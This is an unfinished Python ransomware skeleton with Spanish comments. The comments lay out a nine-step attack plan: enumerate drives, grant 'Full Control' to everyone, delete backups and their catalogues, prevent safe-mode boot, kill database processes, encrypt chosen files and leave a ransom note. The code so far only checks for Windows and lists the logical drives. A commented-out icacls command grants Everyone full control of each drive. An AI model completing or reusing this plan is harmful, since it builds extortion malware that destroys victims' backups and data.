import os
import sys
import platform
import win32api
import subprocess

# Secuencia de acciones del Ransomware
# Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
# Paso 2 - Averiguar que sistemas de almacenamiento hay disponibles
# Paso 3 - Vamos a elevar privilegios, y daremos al programa los permisos de 'Full Control'
# Paso 4 - Necesitamos eliminar las copias de seguridad
# Paso 5 - Impedir que el sistema operativo reinicie en modo seguro
# Paso 6 - Borraremos los catalogos de las copias de seguridad
# Paso 7 - Miraremos de matar los procesos con bases de datos para garantizar el cifrado de estas
# Paso 8 - Dada la lista de dispositivos locales vamos a ir cifrando aquello que nos interese uno a uno (podemos mantener un set de extensiones o un set de carpetas de especial interes)
# Paso 9 - Una vez hemos encriptado todo debemos disponer la nota de rescate garantizando que se pueda realizar el pago

# Algunas preguntas
# a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos

if __name__ == '__main__':
    # 1
    if not platform.system() == 'Windows':
        sys.exit()
        # Necesitamos no dejar huella

    # 2
    local_drives = win32api.GetLogicalDriveStrings()
    local_drives = local_drives.split('\000')[:-1]

    # 3
    for drive in local_drives:
        print(drive)
        # Necesitamos habilitar permisos
        # subprocess.check_output(['icacls.exe',r'drive','/GRANT','*S-1-1-0:F'],stderr=subprocess.STDOUT)


    

